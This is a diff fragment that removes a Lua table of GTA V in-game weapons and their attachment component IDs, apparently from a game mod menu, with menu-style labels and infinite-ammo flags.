-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_HEAVYPISTOL_CLIP_02'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_PI_FLSH'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_PI_SUPP'
-                    }
-                }
-            }
-        },
-        VintagePistol = {
-            id = 'weapon_vintagepistol',
-            name = '~h~~p~▶ ~s~Vintage Pistol',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_VINTAGEPISTOL_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_VINTAGEPISTOL_CLIP_02'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        'Suppressor',
-                        id = 'COMPONENT_AT_PI_SUPP'
-                    }
-                }
-            }
-        },
-        FlareGun = {
-            id = 'weapon_flaregun',
-            name = '~h~~p~▶ ~s~Flare Gun',
-            bInfAmmo = false,
-            mods = {}
-        },
-        MarksmanPistol = {
-            id = 'weapon_marksmanpistol',
-            name = '~h~~p~▶ ~s~Marksman Pistol',
-            bInfAmmo = false,
-            mods = {}
-        },
-        HeavyRevolver = {
-            id = 'weapon_revolver',
-            name = '~h~~p~▶ ~s~Heavy Revolver',
-            bInfAmmo = false,
-            mods = {}
-        },
-        HeavyRevolverMkII = {
-            id = 'weapon_revolver_mk2',
-            name = '~h~~p~▶ ~s~Heavy Revolver Mk II',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Rounds',
-                        id = 'COMPONENT_REVOLVER_MK2_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Tracer Rounds',
-                        id = 'COMPONENT_REVOLVER_MK2_CLIP_TRACER'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Incendiary Rounds',
-                        id = 'COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Hollow Point Rounds',
-                        id = 'COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~FMJ Rounds',
-                        id = 'COMPONENT_REVOLVER_MK2_CLIP_FMJ'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Holograhpic Sight',
-                        id = 'COMPONENT_AT_SIGHTS'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Small Scope',
-                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_PI_FLSH'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Compensator',
-                        id = 'COMPONENT_AT_PI_COMP_03'
-                    }
-                }
-            }
-        },
-        DoubleActionRevolver = {
-            id = 'weapon_doubleaction',
-            name = '~h~~p~▶ ~s~Double Action Revolver',
-            bInfAmmo = false,
-            mods = {}
-        },
-        UpnAtomizer = {
-            id = 'weapon_raypistol',
-            name = '~h~~p~▶ ~s~Up-n-Atomizer',
-            bInfAmmo = false,
-            mods = {}
-        }
-    },
-    SMG = {
-        MicroSMG = {
-            id = 'weapon_microsmg',
-            name = '~h~~p~▶ ~s~Micro SMG',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_MICROSMG_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_MICROSMG_CLIP_02'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Scope',
-                        id = 'COMPONENT_AT_SCOPE_MACRO'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_PI_FLSH'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_AR_SUPP_02'
-                    }
-                }
-            }
-        },
-        SMG = {
-            id = 'weapon_smg',
-            name = '~h~~p~▶ ~s~SMG',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_SMG_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_SMG_CLIP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Drum Magazine',
-                        id = 'COMPONENT_SMG_CLIP_03'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Scope',
-                        id = 'COMPONENT_AT_SCOPE_MACRO_02'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_AR_FLSH'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_PI_SUPP'
-                    }
-                }
-            }
-        },
-        SMGMkII = {
-            id = 'weapon_smg_mk2',
-            name = '~h~~p~▶ ~s~SMG Mk II',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_SMG_MK2_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_SMG_MK2_CLIP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Tracer Rounds',
-                        id = 'COMPONENT_SMG_MK2_CLIP_TRACER'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Incendiary Rounds',
-                        id = 'COMPONENT_SMG_MK2_CLIP_INCENDIARY'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Hollow Point Rounds',
-                        id = 'COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~FMJ Rounds',
-                        id = 'COMPONENT_SMG_MK2_CLIP_FMJ'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Holograhpic Sight',
-                        id = 'COMPONENT_AT_SIGHTS_SMG'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Small Scope',
-                        id = 'COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Medium Scope',
-                        id = 'COMPONENT_AT_SCOPE_SMALL_SMG_MK2'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_AR_FLSH'
-                    }
-                },
-                Barrel = {
-                    {
-                        name = '~h~~p~▶ ~s~Default',
-                        id = 'COMPONENT_AT_SB_BARREL_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Heavy',
-                        id = 'COMPONENT_AT_SB_BARREL_02'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_PI_SUPP'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Flat Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Tactical Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Fat-End Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_03'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Precision Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_04'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Heavy Duty Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_05'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Slanted Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_06'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Split-End Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_07'
-                    }
-                }
-            }
-        },
-        AssaultSMG = {
-            id = 'weapon_assaultsmg',
-            name = '~h~~p~▶ ~s~Assault SMG',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_ASSAULTSMG_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_ASSAULTSMG_CLIP_02'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Scope',
-                        id = 'COMPONENT_AT_SCOPE_MACRO'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_AR_FLSH'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_AR_SUPP_02'
-                    }
-                }
-            }
-        },
-        CombatPDW = {
-            id = 'weapon_combatpdw',
-            name = '~h~~p~▶ ~s~Combat PDW',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_COMBATPDW_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_COMBATPDW_CLIP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Drum Magazine',
-                        id = 'COMPONENT_COMBATPDW_CLIP_03'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Scope',
-                        id = 'COMPONENT_AT_SCOPE_SMALL'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_AR_FLSH'
-                    }
-                },
-                Grips = {
-                    {
-                        name = '~h~~p~▶ ~s~Grip',
-                        id = 'COMPONENT_AT_AR_AFGRIP'
-                    }
-                }
-            }
-        },
-        MachinePistol = {
-            id = 'weapon_machinepistol',
-            name = '~h~~p~▶ ~s~Machine Pistol ',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_MACHINEPISTOL_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_MACHINEPISTOL_CLIP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Drum Magazine',
-                        id = 'COMPONENT_MACHINEPISTOL_CLIP_03'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_PI_SUPP'
-                    }
-                }
-            }
-        },
-        MiniSMG = {
-            id = 'weapon_minismg',
-            name = '~h~~p~▶ ~s~Mini SMG',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_MINISMG_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_MINISMG_CLIP_02'
-                    }
-                }
-            }
-        },
-        UnholyHellbringer = {
-            id = 'weapon_raycarbine',
-            name = '~h~~p~▶ ~s~Unholy Hellbringer',
-            bInfAmmo = false,
-            mods = {}
-        }
-    },
-    Shotguns = {
-        PumpShotgun = {
-            id = 'weapon_pumpshotgun',
-            name = '~h~~p~▶ ~s~Pump Shotgun',
-            bInfAmmo = false,
-            mods = {
-                Flashlight = {
-                    {
-                        'name = Flashlight',
-                        id = 'COMPONENT_AT_AR_FLSH'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_SR_SUPP'
-                    }
-                }
-            }
-        },
-        PumpShotgunMkII = {
-            id = 'weapon_pumpshotgun_mk2',
-            name = '~h~~p~▶ ~s~Pump Shotgun Mk II',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Shells',
-                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Dragon Breath Shells',
-                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Steel Buckshot Shells',
-                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Flechette Shells',
-                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Explosive Slugs',
-                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Holograhpic Sight',
-                        id = 'COMPONENT_AT_SIGHTS'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Small Scope',
-                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Medium Scope',
-                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_AR_FLSH'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_SR_SUPP_03'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Squared Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_08'
-                    }
-                }
-            }
-        },
-        SawedOffShotgun = {
-            id = 'weapon_sawnoffshotgun',
-            name = '~h~~p~▶ ~s~Sawed-Off Shotgun',
-            bInfAmmo = false,
-            mods = {}
-        },
-        AssaultShotgun = {
-            id = 'weapon_assaultshotgun',
-            name = '~h~~p~▶ ~s~Assault Shotgun',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_ASSAULTSHOTGUN_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_ASSAULTSHOTGUN_CLIP_02'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_AR_FLSH'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_AR_SUPP'
-                    }
-                },
-                Grips = {
-                    {
-                        name = '~h~~p~▶ ~s~Grip',
-                        id = 'COMPONENT_AT_AR_AFGRIP'
-                    }
-                }
-            }
-        },
-        BullpupShotgun = {
-            id = 'weapon_bullpupshotgun',
-            name = '~h~~p~▶ ~s~Bullpup Shotgun',
-            bInfAmmo = false,
-            mods = {
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_AR_FLSH'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_AR_SUPP_02'
-                    }
-                },
-                Grips = {
-                    {
-                        name = '~h~~p~▶ ~s~Grip',
-                        id = 'COMPONENT_AT_AR_AFGRIP'
-                    }
-                }
-            }
-        },
-        Musket = {
-            id = 'weapon_musket',
-            name = '~h~~p~▶ ~s~Musket',
-            bInfAmmo = false,
-            mods = {}
-        },
-        HeavyShotgun = {
-            id = 'weapon_heavyshotgun',
-            name = '~h~~p~▶ ~s~Heavy Shotgun',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Drum Magazine',
-                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_02'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_AR_FLSH'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_AR_SUPP_02'
-                    }
-                },
-                Grips = {
-                    {
-                        name = '~h~~p~▶ ~s~Grip',
-                        id = 'COMPONENT_AT_AR_AFGRIP'
-                    }
-                }
-            }
-        },
-        DoubleBarrelShotgun = {
-            id = 'weapon_dbshotgun',
-            name = '~h~~p~▶ ~s~Double Barrel Shotgun',
-            bInfAmmo = false,
-            mods = {}
-        },
-        SweeperShotgun = {
-            id = 'weapon_autoshotgun',
-            name = '~h~~p~▶ ~s~Sweeper Shotgun',
-            bInfAmmo = false,
-            mods = {}
-        }
-    },
-    AssaultRifles = {
-        AssaultRifle = {
-            id = 'weapon_assaultrifle',
-            name = '~h~~p~▶ ~s~Assault Rifle',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Drum Magazine',
-                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_03'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Scope',
-                        id = 'COMPONENT_AT_SCOPE_MACRO'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_AR_FLSH'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_AR_SUPP_02'
-                    }
-                },
-                Grips = {
-                    {
-                        name = '~h~~p~▶ ~s~Grip',
-                        id = 'COMPONENT_AT_AR_AFGRIP'
-                    }
-                }
-            }
-        },
-        AssaultRifleMkII = {
-            id = 'weapon_assaultrifle_mk2',
-            name = '~h~~p~▶ ~s~Assault Rifle Mk II',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Tracer Rounds',
-                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Incendiary Rounds',
-                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Hollow Point Rounds',
-                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~FMJ Rounds',
-                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Holograhpic Sight',
-                        id = 'COMPONENT_AT_SIGHTS'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Small Scope',
-                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Large Scope',
-                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_AR_FLSH'
-                    }
-                },
-                Barrel = {
-                    {
-                        name = '~h~~p~▶ ~s~Default',
-                        id = 'COMPONENT_AT_AR_BARREL_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Heavy',
-                        id = 'COMPONENT_AT_AR_BARREL_0'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_AR_SUPP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Flat Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Tactical Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Fat-End Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_03'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Precision Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_04'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Heavy Duty Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_05'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Slanted Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_06'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Split-End Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_07'
-                    }
-                },
-                Grips = {
-                    {
-                        name = '~h~~p~▶ ~s~Grip',
-                        id = 'COMPONENT_AT_AR_AFGRIP_02'
-                    }
-                }
-            }
-        },
-        CarbineRifle = {
-            id = 'weapon_carbinerifle',
-            name = '~h~~p~▶ ~s~Carbine Rifle',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_CARBINERIFLE_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_CARBINERIFLE_CLIP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Box Magazine',
-                        id = 'COMPONENT_CARBINERIFLE_CLIP_03'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Scope',
-                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_AR_FLSH'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_AR_SUPP'
-                    }
-                },
-                Grips = {
-                    {
-                        name = '~h~~p~▶ ~s~Grip',
-                        id = 'COMPONENT_AT_AR_AFGRIP'
-                    }
-                }
-            }
-        },
-        CarbineRifleMkII = {
-            id = 'weapon_carbinerifle_mk2',
-            name = '~h~~p~▶ ~s~Carbine Rifle Mk II ',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Tracer Rounds',
-                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Incendiary Rounds',
-                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Hollow Point Rounds',
-                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~FMJ Rounds',
-                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Holograhpic Sight',
-                        id = 'COMPONENT_AT_SIGHTS'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Small Scope',
-                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Large Scope',
-                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_AR_FLSH'
-                    }
-                },
-                Barrel = {
-                    {
-                        name = '~h~~p~▶ ~s~Default',
-                        id = 'COMPONENT_AT_CR_BARREL_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Heavy',
-                        id = 'COMPONENT_AT_CR_BARREL_02'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_AR_SUPP'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Flat Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Tactical Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Fat-End Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_03'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Precision Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_04'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Heavy Duty Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_05'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Slanted Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_06'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Split-End Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_07'
-                    }
-                },
-                Grips = {
-                    {
-                        name = '~h~~p~▶ ~s~Grip',
-                        id = 'COMPONENT_AT_AR_AFGRIP_02'
-                    }
-                }
-            }
-        },
-        AdvancedRifle = {
-            id = 'weapon_advancedrifle',
-            name = '~h~~p~▶ ~s~Advanced Rifle ',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_ADVANCEDRIFLE_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_ADVANCEDRIFLE_CLIP_02'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Scope',
-                        id = 'COMPONENT_AT_SCOPE_SMALL'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_AR_FLSH'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_AR_SUPP'
-                    }
-                }
-            }
-        },
-        SpecialCarbine = {
-            id = 'weapon_specialcarbine',
-            name = '~h~~p~▶ ~s~Special Carbine',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_SPECIALCARBINE_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_SPECIALCARBINE_CLIP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Drum Magazine',
-                        id = 'COMPONENT_SPECIALCARBINE_CLIP_03'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Scope',
-                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_AR_FLSH'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_AR_SUPP_02'
-                    }
-                },
-                Grips = {
-                    {
-                        name = '~h~~p~▶ ~s~Grip',
-                        id = 'COMPONENT_AT_AR_AFGRIP'
-                    }
-                }
-            }
-        },
-        SpecialCarbineMkII = {
-            id = 'weapon_specialcarbine_mk2',
-            name = '~h~~p~▶ ~s~Special Carbine Mk II',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Tracer Rounds',
-                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Incendiary Rounds',
-                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Hollow Point Rounds',
